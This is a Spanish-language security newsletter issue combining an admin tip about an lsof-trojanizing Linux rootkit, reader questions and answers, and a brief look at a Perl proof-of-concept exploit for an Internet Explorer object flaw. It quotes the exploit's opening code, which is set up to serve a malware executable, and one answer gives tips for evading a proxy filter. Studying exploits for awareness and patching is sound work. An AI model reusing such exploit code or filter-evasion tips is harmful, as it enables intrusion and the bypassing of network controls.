----------------------------------------------- 
El liderazgo implica recordar errores pasados, 
un análisis de los logros actuales, y una 
imaginación establecida para visualizar los 
problemas del futuro. Stanley C. Allyn 
----------------------------------------------- 

NNL 10 - Como estas ? :) 

1- Pequeños grandes consejos al admin. - linux Tip - 
2- Sitio: Indian site... 
3- Feedback: Los lectores preguntaron. 
4- Mini_analisis de exploit: Iepoc.pl 
5- N de la R. - Notas de la redacción. - 

````````````````````````````````````````` 

((1)) Pequeños grandes consejos al admin ( linux ) 

No crean que "lsof" no se troyaniza, al contrario de 
como suelen desestimarlo algunos libros de seguridad, 
hay determinados kits, rootkits o files privados que no 
son los comunes que usan para troyanizar los habitualmente 
binarios comprometidos de un sistema linux. 
Un ejemplo de ello es: 

.,gg,. .,gg,. 
`$$$$$. .$$$$$' 
`$$$$$. .$$$$$' .,g%d$"^"$b%y,. .,g%d$"^"$b%y,..,g%d$"^"$b%y,. 
`$$$$$. .$$$$$'g$$$$' `$$$$y..g$$$$' .g$$$$' `""' 
$$$$$$$$$$$$.l$$$$: :$$$$ll$$$$: johnny l$$$$: g%d$$b%y,. 
.$$$$$'""`$$$$$.$$$$$p g$$$$$'l$$$$: seven l$$$$: l$$$$: 
.$$$$$' `$$$$$.`^"$b%y,.,g%d~"^' `"--"' `^"$b%y,.,g%d~"^' 
.$$$$$' `$$$$$. 
`""""' `""""' you can stop one, but you can NOT stop all! 

Linux Rootkit v0.7 Private Edition By: Tragedy/Dor 

Designed primarily for RedHat Linux 6.x 
also works with 7.0, and some versions of cobalt linux... 
Should work with all modern glibc2 based linux distributions. 
Most tools are ported from my SunOS and IRIX Rootkits, with some 
modifications. 

***COPYRIGHT NOTICES*** 

Esta version trae una rutina para troyanizar lsof ( entre otras 
cosas ) asi que desde ya les recomiendo a los admins de linux 
utilizar aplicaciones para la verificacion de la integridad de 
files tipo tripware o AIDE. 

http://www.tripwire.org/downloads/index.php 
http://www.cs.tut.fi/~rammer/aide.html 

````````````````````````````````````````` 
((2)) Sitio: 

http://www.nii.co.in 

Sitio en el que se ofrecen algunas herramientas y textos gratis de 
buen nivel y en ingles, ademas de una serie de servicios para 
corporaciones o bien guias para auditar sistemas. 

===================================================== 

((3)) Feedback con lectores 

From: "pgjmanager@*.gob.mx" <pgjmanager@*.gob.mx> 
To: nnl@hushmail.com 

Hola c* buenos días 
Tu boletines están (como se dice en mexico), poca madre, bien chingones, yo 
a penas ando empezando en esto de la seguridad informática, y desde hace 2 
o tres mails te ando preguntando lo mismo, ya resolviste mis dudas, 
Gracias al Kerio y el Esteganos, pero tengo todavía una duda muy grande y 
haber cuando me la puedes responder. 
El PGP (Pretty Good Privacy), se supone o es una forma de pensar mía de lo 
que he investigado sobre el, lo mejor en criptografia, hasta el 11 de 
septiembre del 2001, que el gobierno EEUU obligo a NAI y al autor del PGP a 
dar sus codigos fuentes, sigue siendo seguro, por que nunca hablas sobre el 
PGP´, bueno yo creo que sería algo bueno, ya que tu tienes un chingo de 
experienca mas que yo, por fa resuelveme la duda o.k. 
y saludos desde chiapas, a ver cuando te das una vuelta por aca. 

R:> Buenas noches... :) chido el PGP no ? 
Mira, uso PGP desde hace algunos años, actualmente la version 7.0.3 porque 
no quise comprar su licencia de uso "home" de la 8.0, version que vino con 
reformas que desconozco y en cuanto los servicios ya nada me extraña. 
Aprovecho para darles algunos consejos a aquellos que recien se meten a 
usar PGP: 
* Si instalan la ultima version (8.0) en Windows no van a poder encriptar 
mensajes desde su cliente de correo, solo encriptar files, si cometen ese 
error y desean volver a su version anterior una salida rapida es restaurar 
el sistema. * El mejor tutorial de PGP esta en la misma instalacion, trae 
un .pdf demasiado completo o en Google encontraran infinidad de info sobre 
el tema Gnupg-PGP. * Si desean borrado seguro utilicen desde el PGP mismo 
"wipe" - click derecho sobre archivo > pgp > wipe o "PGP Wipe Free Space 
Wizard" - borrado seguro de espacio en blanco en disco - ( nadie podra 
luego recuperar esos archivos borrados e importantes de sus discos ) - 
* http://www.pgpi.org/products/pgp/versions/freeware/win32/7.0.3/ version 
freeware, y si bien esta hecho para Win2k, anda en XP tambien, solo no se 
ven bien los iconos en Outlook. 
* En la entrevista que sale a mediados de mes a DS, - btw, este mes tengo 
muchos compromisos, no seria extraño que NNL salga discontinuado. - se 
trata el tema, por ejemplo una de las preguntas relacionadas es si por 
ejemplo tiene conocimiento sobre cuanto tardaria la NSA en quebrar un mail 
cifrado nuestro, con PGP claro. Saludos 
............... 

From: Oscar * <repair@*.com.uy> 
To: NNL Newsletter <nnl@hushmail.com> 

Estimado C*: 
Desde hace tiempo leo los boletines que ud. envía por e-mail, y la 
verdad es que si bien no los entiendo 
mucho (ya que no soy administrador) los leo detenidamente tratando 
de aprender algo. 
Voy derecho a las consultas: 
1- tengo una maquina que tiene una mother SOYO SY-6BVA 133, mí intención 
es actualizar el BIOS. Descargue desde la página de SOYO dicha 
actualización, seguí los pasos como dice alli y no me actualiza 
la maquina. 
2- Donde puedo encontrar información sobre los puertos de comunicación 
del PC, algo que indique para que sirve tal o cual puerto, 
leyendo un mail de microsoft, hablaba del puerto 135 y no tengo 
idea de cuantos puertos existen, ni cuales son y para que sirven. 
Desde ya muchas gracias por leer este mail 
Atte. Oscar **** 

1- Hola Oscar, escribiste mal el nombre de la placa :) > 
http://www.hothardware.com/hh_files/Motherboards/SY-6VBA-133.shtml 
Contcatate con los chicos de este sitio si sigues aun con problemas > 
http://www.enxebre.es/hardware/articulos/sy-6vba/sy-6vba3.htm 
2- Aca tenes una pequeña lista decente en el caso de un Windows 2000 > 
http://bibliotecainformatica.iespana.es/bibliotecainformatica/w2000/puertos.htm 
Lo que tenes que ver es que son los determinados servicios que corren alli 
en cada puerto - como para que te des una idea basicamente son entradas o 
puertas para establecer conexiones, transmision entre sistemas o del tipo 
cliente/server- , sus protocolos, y probablemente tambien si tienes algun 
puerto abierto y no sabes de que es tambien averiguarlo, una buena utilidad 
para ello es fport > http://www.foundstone.com/resources/proddesc/fport.htm 
Al contrario de lo que creen muchos chicos, un puerto abierto no significa 
que hagas una conexion telnet alli y ya estes dentro de la maquina, tiene 
sus protocolos, su modo de enlace, sus modos de autentificacion... 
Busca por otro lado informacion sobre los scanners de puerto. 
No hay de que. p/d: Para aquellos admins un poco mas avanzados, nunca se 
confien en el numero del puerto abierto ya que puede ser un backdoor 
disimulado en un determinado servicio, suele pasar si no fue backdoreado 
desde el kernel o de otra forma. 

............... 

From: ** <*@*.cu> 
To: NNL Newsletter <nnl@hushmail.com> 

Subject: =?iso-8859-1?Q?=BFCrees_que_para_...?= 

H! Flaco, hace rato que leo los mensajes que llegan de la lista, me parecen 
bárbaros o como se dice en buen cubano están COJONUDOS... quería hacerte 
un par de preguntas ¿Crees que para ser un buen administraidor haga 
falta leerse los RFC? Si es así no se en que tiempo lo has logrado... yo 
soy profesor un la universidad a parte de ser admin. y tus consejos me 
han ayudado mucho pero la verdad no tengo mucho tiempo así que no creo 
que pueda jamás revisar los RFC... Sal2s, MaRk. 
P.D: No publiques la mi dirección. 

R:> Hola socio, gracias. Mira, es relativo al tiempo que tengas, todo se 
basa en el tiempo... pero si te vendria bien leer los RFC principales, los 
que tipifican los protocolos mas usuales stmp, ssh, ftp, etc etc y los de 
redes, 1918, etc. :) no viene mal leer esas "partidas de nacimiento" o 
reglas, van a ayudarte o quiza te den mas speech para con tus alumnos! 
;) saludos. * Este es el link del tema que tocamos > 
http://www.rfc-editor.org/rfcxx00.html 

............... 

From: =?iso-8859-1?q?C=20** <fotoaldia@**.com> 
To: NNL Newsletter <nnl@hushmail.com> 

Subject: Appledudas 

Estimado Cy-bermataburros: 
Poseo un Apple PPc con OS 9.2.2, hasta ahora nunca me 
entere de virus posibles para esta plataforma, pero 
que yo no los conozca no quiere decir que no existan, 
Pregunta: Existen?. 
De ser asi, tendria que tener alguna proteccion? 
Es util y existe un Firewall para las mac? 
Tengo instalada una PC virtual con Windows 98, podria 
atacarme un virus y destruir el resto del disco que no 
es de PC? 
Estas son algunas dudas que me asaltan de a ratos, 
tengo mas pero no quiero ser abusivo con tu poco comun 
sentido de hacer el bien sin mirar a quien. 
Dede ya agradezco que estes en mi casilla de mail de 
vez en vez y hago votos para que puedas seguir 
desasnando gente tan gentilmente, como ser decente de 
esta tierra demente. (me salio el poeta de biorci 
porteño) gracias y hasta la prox. Carlo 

R:> :) ( tengo algunas amigas fanaticas de MAC ) 
La logica de un antivirus para MAC es mas para que no 
sigas desparramando attachs infectados hacia otros con 
virus y/o cosas que afecten a otros Windows, look > 
http://www.symantec.com/nav/nav_mac/ pero si existen, 
en una proporcion mucho menor. No dejes de hecharle una 
mirada a esto > http://www.faqs.org/faqs/computer-virus/macintosh-faq/ 
"Tengo instalada una PC virtual con Windows 98, podria 
atacarme un virus y destruir el resto del disco que no 
es de PC?" Son diferentes arquitecturas :) 
Firewalls ? busca en su home > 
http://www.apple.com/es/macosx/applications/symantec/ 
Gracias Carlo, tratare de seguir sacandolo a tiempo, 
esto esta mas alla de mis ganas, depende de un manojo 
aparte de factores. 

............... 

From: Dr_Bashir <dr_jbashir@**.com.ar> 
To: NNL Newsletter <nnl@hushmail.com> 

Subject: Busqueda de informacion: MAC OS y Crisis del Software 

Hola, como estas? 
Bueno escribo para felicitarte por la labor que estas desarrollando 
en la expansion del conocimiento en forma libre y gratuita. 
En pos de ese ideal, solicito tu asistencia: 
Soy estudiante de ingenieria en sistemas, y necesito conseguir: 
1. Papers, publicados y serios, sobre la crisis del software 
2. Informacion sobre el SO MAC, cualquiera de las ultimas versiones 
(Arquitectura del sistema, file managment, manejo de memoria) 
Desde ya cualquier ayuda que me puedas dar, links, e-books, lo que 
sea sera bienvenida. Muchas Gracias, Julian 

R:> Muchas gracias, todo muy bien por suerte. :) 
Mire muy por arriba una investigacion española que deberias ver alli > 
http://www.google.com.ar/search?hl=es&ie=UTF-8&oe=UTF-8&q=crisis+del+ 
software&btnG=B%C3%BAsqueda+en+Google&meta=lr%3Dlang_es 
( todos los que preguntan aqui deberian ver Google primero... ) 
Sobre la info del sistema operativo no hay nada mejor que casa > 
http://developer.apple.com/macosx/architecture/ 
No hay porque, saludos. 

............... 

From: KoP_CL <koperator@*.net> 
To: nnl@hushmail.com 
Subject: nnl --> consulta desde CL 

Muy bueno el newsletter (creo que asi se escribe) 
Mi consulta es la siguiente: Tengo un sistema basado en Windows 
2000 professional que tiene corriendo los servicios de Apache, SQL y 
PHP. ¿Es muy riesgoso usar alguna herramienta de administracion remota 
para la maquina (como el VNC) aunque se administre desde la misma red LAN? 
Dato anexo: estoy suscrito a varios boletines de seguridad 
para mantenerme informado de alguna vulnerabilidad y ejekuto 
periodicamente el winupdt por cualquier eventualidad. Saludos desde CL. 
KpT-. 

R:> Gracias :) mira, mas alla de esos servicios ( te recomendaria el 
Windows 2003 server para todo ello o mudarte a Debian ) te digo que puedes 
usar PCanywhere 10.5, cambias el puerto desde el registro y listo, demasiado 
mas seguro que VNC y mas práctico, no solo porque loguearias con user/pass 
sino que desde la Desktop con dos clicks ya estarias administrando la 
maquina remota. 
Saludos 

............... 

From: elcaminante@*.com 
To: nnl@hushmail.com 

Subject: Salu2 y consulta 

Hola C* !!! Es un gusto leer todo lo que escribes y publicas, 
has sido un gran aporte a convertir la informacion en algo libre 
y para todos. Me ha sido muy grato, desde la vertienete pacifica de 
los andes seguir con atencion cuasi religiosa la informacion que nos 
provees. Aprovecho de plantearte una duda, por si puedes aconsejarme 
algo. Por mis labores, debo verificar periodicamente el estado on 
line de varias consultas web, y en caso de detectar problemas solicitar 
ya sea el reinico de paches o lo que corresponda. 
Esta es una tarea "latosa", que casi no tomo en cuenta por lo mismo. 
he buscado en la red herramientas que me permitan automatizar este trabajo 
y algo he encontrado , pero no resuelve el problema de fondo. 
Los antecedentes de estas consultas son: 
Estan elaboradas en jsp, java, php, casi todas consultan datos desde 
Oracle directamente , o a través de IAS (internet aplication Server 
de ORacle), las consultas piden la autentificacion del usuario para su 
ejecución, para ello utilizan la info de un ldap. 
Mi problema reside en poder almacenar el usuario clave del ldap y los 
parametros de la consulta en una herramienta que realice la navegacion. 
Existen algunos simuladores de stress para web, pero no permiten almacenar 
la autentificacion y realizar varias queryes a distintas direcciones 
web. Sabiendo que no es tu tema, te agradecere cualquier comentario 
Salu2 Fraternales desde Chile 

R:> La solucion a tu problema esta detalladamente explicado en este libro: 
http://www.cuspide.com/detalle_libro.php?isbn=8448121856 - recien editado - 
Saludos, parsea mucho y no uses los mismos pass en las maquinas. :) 

............... 

From: "Fco. Jose Ocana *" <ocana@*.com> 
To: nnl@hushmail.com 
Subject: Pregunta acerca de monitorizacion de equipos 

Hola. 

En el [nnl] º 9 hablasteis acerca de programas (ejemplo 
"http://www.employee-monitoring.com/spector-pro.htm 
") que se instalan en los equipos de los empleados y se usan para 
controlar que es lo que hacen y hasta se puede monitorizar que es 
lo que tinene en la pantalla en ese momento un cierto equipo. 
Ahora la pregunta del millon. ¿Como puedo se puede detectar si tenemos 
instalado en nuestro equipo un programa de esos.? 
Actualmente uso como sistema operativo Windows 2000 y Windows XP 
Perdonar si os he enviado a dos el e-mail pero no se ha quien tengo que 
enviarselo. Un saludo Franc 

R:> Cuando entres a trabajar a algun lado asegurate tres cosas: de tener 
una clave excelente de administracion, de instalar tu propia Desktop desde 
cero y por ultimo de llevar una listado de los procesos que alli corren. 
Ante alguna variacion en la primera - clave cambiada - o ultima opcion 
- procesos extraños o nuevos - , aplica la 2 nuevamente. 
Luego hay un listado de cosas mas a tener en cuenta, pero ya seria un 
libro de consejos para el administrador mediocre, aunque te voy a dar uno: 
no uses la PC de tu trabajo para cosas personales, eso hoy por hoy te 
costaria el puesto. 
La logica es clara, sabes que te monitorean, si no haces nada malo porque 
preocuparse ? Saludos Franc. C 

.................. 

From: Enrique ------- <e*@ceibo.fiec.*.ec> 
To: NNL Newsletter <nnl@hushmail.com> 
Subject: Configuracion de redes 

Hola, me podrias ayudar con un pdf que trate sobre las configuraciones de 
redes, especialmente en la plataforma window 95,98,XP. 

Gracias de antemano 

R:> http://www1.rincondelvago.com/apuntes.html en el buscador pon "redes" 
alli encontraras trabajos serios como ser monografias y mucho mas acerca de 
ese o muchisimos otros temas :) - se lo recomiendo a todo aquel que no pueda 
conseguir libros, quiera textos medianamente serios y no esos tutorialz by 
4s3s1n0 v1r7u4l or something bullshit like that.- ciao 

.................. 

From: El Gran Pensador Contemporaneo <esba@**.com.ar> 
To: nnl@hushmail.com 

Hola C*... 
Antes que nada buenisimo lo tuyo, excelente, espero que sigas por 
el mismo camino, compartiendo tus conocimientos. 
Te escribia para hacerte una consulta. 
Es posible acceder a contenidos de aquellas paginas, que tienen 
contenido exclusivo para los que se conectan con su propia conexion? 
Ejemplo: www.lossimuladores.com.ar.? 
Varias de sus secciones, entre ellas la de videos, solo puede 
accederse si nos conectamos con su numero de conexion a internet. 
Esto es ridiculo, ya que todos sabemos en que condiciones puede verse 
un video con dial up, ademas del tiempo (esto no es ridiculo teniendo 
en cuenta la $$$$ que deja la relacion costo usuario/ganancia empresa). 
La idea es acceder por ejemplo desde banda ancha, o incluso si fuera 
desde dial up, con mi proveedor 0610. 
Se que en otros paises, por ejemplo en España, para aquellos que tienen 
Banda ancha pueden acceder a esos sitios marcando un telefono (que tiene 
su buen costo) y a uno le dan una especie de codigo con el cual poder 
entrar, pero al menos en esta no hay nada de eso. 
Bueno Don Cyr, lo voy dejando, no sin antes agradecerte el haber 
leido mi mail (jejejeje, espero que lo hagas :) ) 
Salutes 

Martin 

R:> Es un plagio moderno de Brigada A ( A-team ) esa serie :) 
Mira, hay como minimo dos formas posibles pero ilegales de obtener ese 
material, visita otros sitios, grabalo en VHF, o espera a que salga la 
nueva saga de Invasion V y te paso luego los DivX. 
Seria muy estupido que publique cosas encontra de Telec*m o Datamark*ts, 
ademas por respeto a todos los amigos y conocidos que alli tengo. 
Por ultima vez explico aqui: no voy a contestar esta clase de mails para 
sacar provecho de modo fraudulento, estafa o cometer cualquier delito 
informatico. ( leo todos los mails, contesto los que valen la pena ) 
salutte 

.................. 

From: ?¿ 

Que haces C* espero que todo bien, che la cuestión por la que te escrivo 
es la siguiente: 

Me instale el NSW 2003 pero al ejecutar el Live update me da un error, en el 
cual me pide verificar la configuración de la coneccion o que reinstale el 
norton. Tambien cada tanto me aparece un cartel que me dice que no se puede 
iniciar la descarga de las actualizaciones y me muestra una dirección de la 
www de symantec de la mesa de alluda pero no me soluciona nada. 
Me serviria si me poudieras decir como solucionar esto o que mandes la 
direccion que mandaste en el nnl-nº8 que ponias la direccion de donde bajar 
la actualizacion manualmente ya que cadavez que lo intento me dice que el 
archivo no existe. 
Bueno me despido y espero que me puedas contestar. Simacho 

R:> Simacho, preparate un link con este acceso desde tu Desktop 
http://securityresponse.symantec.com/avcenter/download/pages/US-N95.html 
y cada 3 dias instala la actualizacion que alli encontraras, saludos. 
Por el libe update pueden ser muchos motivos que no te funcione, 
manejate con ese link mejor. ;) 

......................... 

From: KronDC <KronDC@*.com> 
To: nnl@hushmail.com 

Subject: Procesadores y Linux 

Hola C*, antes que nada (lo de siempre) decirte que el boletín esta 
muy bueno, espero que mientras puedas sigas, esta muy bien que facilites 
el aprendizaje como lo estas haciendo. 
Ahora el motivo del mail, tengo una Pentium de 233Mhz y estoy pensando 
seriamente migrar a Linux, pero por desgracia la mayoría de los OS Linux 
parece que no son compatibles con el micro que tengo y por lo tanto no me 
funcionan, ya sea por el video, el modem, el sonido, el mouse, o el teclado, 
he visto en los requerimiento de estos OS que la mayoría exigen PCs x86, 
pero aquí esta problema, no tengo muy claro esto de los procesadores x86 
(supongo que se refiere a 586, 686, etc.) o las arquitecturas de 
procesadores, por ej. "linuxiso.com" te dá la posibilidad de buscar OS por 
tipo de procesador requerido (i486, i586, etc.) y yo ni siquiera sé con 
cual de todos esos se corresponde mi micro, en definitiva necesito si me 
podes aclarar un poco esto de los procesadores y las arquitecturas ya que 
la única solución que tengo es comprar un mother y/o procesador nuevo (solo 
por tener Linux) que cumpla con esos requerimientos (por eso necesito que 
me lo aclares) y si no es mucho pedir, que me recomiendes alguna marca y/o 
modelo específicos. Gracias por leer el mail, y por si respondes, gracias 
por eso. 

R:> Gracias. Mira, no te escribire un libro por falta de tiempo, pero en una 
pc de similares caracteristicas hace algunos años testee las distros 
turbolinux, corel linux, mandrake y conectiva. 
Ademas tene siempre en cuenta de que tenes que aprender a "levantar" cada 
una de las cosas o dispositivos que tengas, esa es una de las gracias y 
cosas 
mas divertidas que tiene eso... no porque no te ande una placa la distro es 
mala, error, es que aun no sabes como administrarla. btw instalar 
actualmente 
Red Hat 9.0 es mas facil que hacerlo con Windows, mucho GUI, levanta 
cualquier cosa, le pones un pedazo de carton o una chuleta de cerdo como 
modem y te lo reconoce! :) vas a tener que bajarte algunos .iso e ir 
probando, aprendiendo, desconfigurando... leer mucho claro, "man", y 
articulos como 
estos te van a ayudar 
http://www.terra.com.uy/canales/tecnologia/72/72061.html 
pero no te en_rosques en el tema arquitecturas aun por una simple 
instalacion, 
pon la atencion en la "administracion" y " el uso" claro. Saludos. 

......................... 

From: =?iso-8859-1?q?sebastian=<profi21@*.es> 
To: NNL Newsletter <nnl@hushmail.com> 

Subject: sistemas operativos 

Ante todo quiero felicitar por el servicio que nos 
das a nosotros brindandonos informacion y despejando 
nuestras dudas en una forma sensilla y clara . a la 
vez , Podrias darme algunas paginas para encontrar 
informacion sobre los componentes, requerimientos de 
un sistema operativo ya sea linux , unix ...u otro ya 
que estoy realizando un trabajo de investigacion y me 
seria muy util toda la ayuda posible para 
poderencontrar informacion y contrastar todo tipo de 
S.O existente en la actualidad y poder estudiarlo con 
todo detenimiento ..gracias Sebastian 

R:> Mira, agarra un lapiz y un papel y preparate una lista 
con todas las distribuciones de linux y todos los OS que 
se te vengan a la cabeza, luego ve a sus sitios 
institucionales y toma nota de cada uno y por ultimo para 
sacar un trabajo excelente preparate un apartado sobre los 
OS en desarrollo, aun en beta o similar, quien sabe en 10 
años lo que seran dichos emprendimientos no ? 
http://www.firstmonday.dk/issues/issue3_3/torvalds/ 
Exitos, good work. 

......................... 

From: "Victor *" <dantes@ismm*.cu> 
To: nnl@hushmail.com 

Subject: Hola C*, desde Cuba 

Hola C*, he estado leyendo tu newsletter con interés siempre que me 
ha llegado y me gusta mucho las explicaciones que das y tu etica, soy 
sociologo pero ya sabes que hoy en día el que no está pegado a una pc , 
no está en el mundo real. Bueno pues necesito que me ayudes, tengo pocas 
interrogantes, primeramente necesito que me ayudes porque mi servidor 
de internet no permite usar correo yahoo, porque el servidor proxy 
tiene un filtro que apenas pones la palabra email o correo te tumba 
la conexión a internet y entonces quisiera que me ayudaras a burlar 
dicho filtro porque el correo yahoo me hace falta. He escuchado decir 
que existen unos servidores htts que hacen que mi servidor proxy lea 
solo esa páguina y que me permita poner otras direcciones sin que se 
me caiga la conexión a internet. Bueno , expicame que son los servidores 
htts y en que se utilizan o como puedo para burlar el filtro, 
te estima Victor Hugo, un abrazo desde mi cuba bella. 

R:> Muchas Gracias :) mira, tampoco te pases la vida en la pc, lo 
indispensable conectate, en la net hay muchisima basura y el tiempo no 
tiene precio. - sueno muy a "Carpe Diem" no ? :) pues si socio, hay una 
vida real que hay que tener y no esta precisamente en las pcs - 
Desconozco exactamente como te estaran filtrando, por ejemplo GET ( por 
darte solo un ejemplo ) tiene cuentas de: solo correo, solo correo y 
algunas www, y navegacion full c/correo, hagas lo que hagas alli necesitas 
una cuenta full... quiza con mas detalles del ISP o detalles de tu red te 
daria una solucion certera pero... 
Trata algo simple, a ver si funciona, prueba con los socks 
http://www.samair.ru/proxy/ ( usa los listados del foro de ahi que son 
los actuales ) y sino haz algo muy simple, sacate una cuenta en hushmail 
por ejemplo o cualquier otro email ( pop3 o no ) que a su vez te chequee 
la cuenta de yahoo automaticamente - hasta ni rastros dejarias entiendes ? 
- y desde tu cliente de correo o de donde quieras los envias supuestamente 
desde yahoo, no creo que el admin trate de filtrar todos los sitios de 
mails del mundo. Si no puedes llegar a tus mails que ellos lleguen a ti 
- una adaptacion 2003 de un refran de Mahoma - , triangúlalos. 
Un abrazo a ti y a toda la gente querida de alli que conozco y nos leen. 

......................... 

From: mat@*.net 
To: nnl@hushmail.com 

Subject: Buenos libros online 

Chango, pasale este link a la comunidad. 
http://webs.sinectis.com.ar/curso/ 
Son tres libros excelentes de redes Wireless. 

De nada. 
Saludos. 

Mat 

......................... 

From: Diego * <diego@*.com.ar> 
To: nnl@hushmail.com 

Subject: Sobre la seguridad en los bancos (tratada en NNL 9) 

Hola! 

Te escribo por primera vez, para aportar otro punto de vista sobre el 
tema de la seguridad en los bancos (ver el NNL 9)... alli alguien se 
quejaba de que los sistemas de los bancos son mediocres (seguramente 
cierto, trabajo haciendo sistemas, y he visto "las entrañas" de sistemas 
que uno piensa "guau que groso" y en realidad estan mal implementados y 
son ineficientes), y yo tambien soy partidario de la linea "dura" con 
respecto a la seguridad (passwords largos, renovaciones periodicas, etc), 
y sobre todo me interesa mas que nada porque estoy interesado en la 
democracia electronica (con todo el sinfin de problemas que acarrea de 
autenticacion, fiscalizacion, etc)... 
Pero volviendo al tema, me he dado cuenta de que hay una razon muy simple 
para que el login de los bancos sea por "numero de documento", en vez de 
una chorrada de 10 a 20 números: si fuera mas complicado, el 90% de los 
clientes que a duras penas utilizan hoy el sistema, se quedarian afuera 
(quien no ha sufrido en la cola de un cajero automatico, cuando viene 
una persona adulta a sacar plata, tardan siglos), y la segunda, si el 
login fuera un numero de 10 a 20 cifras, salvo que uno sea un "freak" 
(no se si lo escribi bien) como los que presentaria Susana en su programa, 
nadie se lo acordaria, y terminaria anotandolo en un papelito, que es peor 
que usar el numero de documento. 
Asi que el punto que queria resaltar, es que a los bancos les sale mas 
barato absorber 1 o 2 estafas cada tanto, que tener un centro de atencion 
al cliente monstruso con telefonistas las 24:00 hs para atender a los miles 
de problemas que tendrias los usuarios... cuestion de practicidad. ;-) 
Muy bueno tu ñusletah, me gusta la actitud lúdica que demostrás a veces ;-) 
Besos, Diego 

R:> :) como va Diego... mira, puede implementarse, es que la gente a cargo 
de eso tampoco son un poco duchos ( no_capacitados contratados por no_ 
capacitados que no saben formar una 2da, 3ra y 4ta linea de personal ) - 
No vas a creerme, pero aun hay ejecutivos que contratan gente menos 
inteligente que ellos y asi sucesivamente hasta llegar al portero. - 
Implementar eso es facil, con una clausula, redactas sobre los riesgos del 
sistema tradicional - nada de letras chicas aqui - y le propones el pass 
digitalizando hasta 20 digitos, decime: nosotros debemos saber como minimo 
muchisimas canciones de memoria, incluido rezos, poemas, palabras, frases... 
no vas a poder memorizar de 10 a 20 numeros ? y sino les gusta que paguen 
un seguro o al firmar desliga a la empresa a no reconocer malversaciones de 
fondo desde x punto. En cuanto al sistema de mesa de ayuda o monstruoso de 
telefonistas esta mas que claro que lo pagamos :) a la empresa no le sale 
nada, o de ultima si el cliente quiere contar con ese servicio mas el 
seguro, le brindas un paquete. Ahora no se porque no implementan mejores 
cosas siendo que nosotros pagariamos por ello. 
Esta muy bien ser practico, pero sin caer en el simplismo, suponiendo que 
tenga una cuenta alta y de constante movimiento "jamas" voy a ir a una 
entidad con politicas tradicionales de seguridad o carentes de ellas. 
Pero bueno estimado Diego, pareceria ser que aun nos falta mucho para 
ser como en los paises bajos o en algunos paises europeos :) eso saco en 
limpio 
de esta zaga de "feedback bancario", que podria hacerse mucho mejor no tengo 
dudas. "ñusletah"? que buen acento british, en el proximo NNL te voy a 
comentar sobre un sistema arabe de transaccion monetaria y financiacion sin 
papeles, ni registros auditables, muy interesante que se me vino ahora a la 
cabeza 
y ya no tengo mas tiempo. C 

......................... 

((4)) Mini_analisis de exploit: iepoc.pl 

---8<--- 

#!/usr/bin/perl -w 
#! Proof of Concept - IE Object Flaw 
#! by drunix 
#! 
#! This should run fine with any perl interpreter, including 
win32/activestate. 
#! 
#! Systems Affected: 
#! 
#! Microsoft Internet Explorer 5.01 
#! Microsoft Internet Explorer 5.5 
#! Microsoft Internet Explorer 6.0 
#! Microsoft Internet Explorer 6.0 for Windows Server 2003 
#! 
#! Credit: Eeye Digial Security - Discovery of Bug 
#! Malware (Drew?) - VBscript and download/run concept 
#! Perl Cookbook - Some forking server code c/p'd 
#! 
#! Greets: xd, powr, rain, kulj, virii, volkam, pozer, etc. 
#! 
#! All my friends. You know who you are. 
#! 
#! Usage: If you can't figure it out, you're probably not responsible enough 
#! to have this.use strict; 
use IO::Socket; 
use POSIX qw(:sys_wait_h); 
require "hexcomp.pm"; 

my $fn = "c:/Apache/malware.exe"; 
my $countperline = 30; 
my $serverip = 'localhost'; 
my @serverports = (9988,9989); 

my $htmlheader = 
'HTTP/1.1 200 OK' . "\r\n" . 
'Date: Thu, 28 Aug 2003 03:52:01 GMT' . "\r\n" . 
'Server: Apache' . "\r\n" . 
'Last-Modified: Sun, 24 Aug 2003 18:55:15 GMT ' . "\r\n" . 
'ETag: "0-d1-3f490a13"' . "\r\n" . 
'Accept-Ranges: bytes' . "\r\n" . 
'Content-Length: 209' . "\r\n" . 
'Keep-Alive: timeout=15, max=100' . "\r\n" . 
'Connection: Keep-Alive' . "\r\n" . 
'Content-Type: text/html' . "\r\n\r\n"; 

---8<--- 

El advisory de EEye como siempre bien en detalle: 
http://www.eeye.com/html/Research/Advisories/AD20030820.html 

Uds se imaginaran el resto. Actualicen sus plataformas Windows. 
-------------------------------------------- 

((5)) - N de la R. - Notas de la redacción. - 

Antes que nada disculpen la tardanza, Setiembre es un mes de muchos 
compromisos asi que no esperen que saque a tiempo NNL. :) 
A aquellos que no les respondo los mails sepan esperar, desde ya les 
envio saludos a todos, pasenla bien y disfruten. 

NNL Newsletter By C*. 
_________________________________________________________________________ 
Preguntas, sugerencias, ofertas de trabajo, donaciones, sponsors, notas, 
contribuciones, dirigirse a: soporte@gmail.com 

